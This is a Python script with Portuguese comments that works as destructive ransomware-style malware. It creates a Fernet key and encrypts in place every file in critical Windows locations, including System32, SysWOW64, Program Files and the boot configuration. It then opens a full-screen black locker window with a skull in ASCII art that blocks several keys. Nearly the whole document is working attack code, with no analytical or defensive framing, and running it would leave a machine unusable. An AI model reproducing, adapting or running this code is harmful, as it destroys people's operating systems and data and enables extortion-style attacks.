import os
import tkinter as tk

from cryptography.fernet import Fernet


# Gera uma chave e salva em um arquivo
def generate_key():
    key = Fernet.generate_key()
    with open("filekey.key", "wb") as key_file:
        key_file.write(key)
    print("Chave gerada e salva como 'filekey.key'.")

# Carrega a chave
def load_key():
    with open("filekey.key", "rb") as key_file:
        return key_file.read()

# Criptografa o arquivo
def encrypt_file(file_name):
    if not os.path.exists(file_name):
        print(f"O arquivo '{file_name}' não existe.")
        return

    key = load_key()
    fernet = Fernet(key)

    with open(file_name, "rb") as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    with open(file_name, "wb") as encrypted_file:
        encrypted_file.write(encrypted)

    print(f"O arquivo '{file_name}' foi criptografado.")

# Descriptografa o arquivo
def decrypt_file(file_name):
    if not os.path.exists(file_name):
        print(f"O arquivo '{file_name}' não existe.")
        return

    key = load_key()
    fernet = Fernet(key)

    with open(file_name, "rb") as encrypted_file:
        encrypted = encrypted_file.read()

    decrypted = fernet.decrypt(encrypted)

    with open(file_name, "wb") as decrypted_file:
        decrypted_file.write(decrypted)

    print(f"O arquivo '{file_name}' foi descriptografado.")

# Criptografa todos os arquivos em um diretório
def encrypt_all_files_in_directory(directory):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path):  # Verifica se é um arquivo
            encrypt_file(file_path)

# Descriptografa todos os arquivos em um diretório
def decrypt_all_files_in_directory(directory):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path):  # Verifica se é um arquivo
            decrypt_file(file_path)

# Criptografa arquivos em múltiplos diretórios
def encrypt_multiple_directories(directories):
    for directory in directories:
        if os.path.exists(directory):
            print(f"Criptografando arquivos no diretório: {directory}")
            encrypt_all_files_in_directory(directory)
        else:
            print(f"O diretório '{directory}' não existe.")

# Define a arte ASCII da caveira
skull_ascii = """
           uuuuuuu
        uu$$$$$$$$$$$uu
     uu$$$$$$$$$$$$$$$$$uu
    u$$$$$$$$$$$$$$$$$$$$$u
   u$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$"   "$$$"   "$$$$$$u
  "$$$$"      u$u       $$$$"
   $$$u       u$u       u$$$
   $$$u      u$$$u      u$$$
    "$$$$uu$$$   $$$uu$$$$"
     "$$$$$$$"   "$$$$$$$"
       u$$$$$$$u$$$$$$$u
        u$"$"$"$"$"$"$u
             uuuuu
"""

# Função para bloquear interações do teclado e mouse
def block_interaction(event):
    return "break"  # Impede qualquer interação

# Cria a janela principal da tela de bloqueio
def create_blocking_screen():
    root = tk.Tk()
    root.attributes('-fullscreen', True)  # Tamanho da tela inteira
    root.configure(bg='black')  # Cor de fundo
    root.overrideredirect(True)  # Remove a barra de título

    # Cria um rótulo para exibir a arte ASCII
    label = tk.Label(root, text=skull_ascii, font=("Courier", 12), fg="green", bg='black')
    label.pack(expand=True)

    # Bloqueia teclas específicas e cliques do mouse
    keys_to_block = [
        "<Key-space>", "<Key-Return>", "<Key-Escape>", "<Key-BackSpace>", "<Key-Delete>"
        # Adicione outras teclas especiais que você quer bloquear
    ]

    for key in keys_to_block:
        root.bind(key, block_interaction)

    # Inicia a janela
    root.mainloop()

# Exemplo de uso
if __name__ == "__main__":
    # Gera a chave (execute apenas uma vez)
    if not os.path.exists("filekey.key"):
        generate_key()

    # Defina os diretórios que você deseja criptografar
    directories = [
        r"C:\Windows\System32",  # Substitua pelo primeiro diretório
        r"C:\Windows\explorer.exe",   # Substitua pelo segundo diretório
        r"C:\boot.ini",    # Substitua pelo terceiro diretório
        r"C:\Boot\BCD",  # Substitua pelo quarto diretório
        r"C:\Program Files",   # Substitua pelo quinto diretório
        r"C:\Program Files (x86)",    # Substitua pelo sexto diretório
        r"C:\Windows\SysWOW64"    # Substitua pelo sétimo diretório",  # Exemplo de diretório no Linux
        # Adicione outros diretórios
    ]

    # Criptografa todos os arquivos nos diretórios
    encrypt_multiple_directories(directories)

    # Bloqueia as interações e apresenta a tela de bloqueio
    create_blocking_screen()
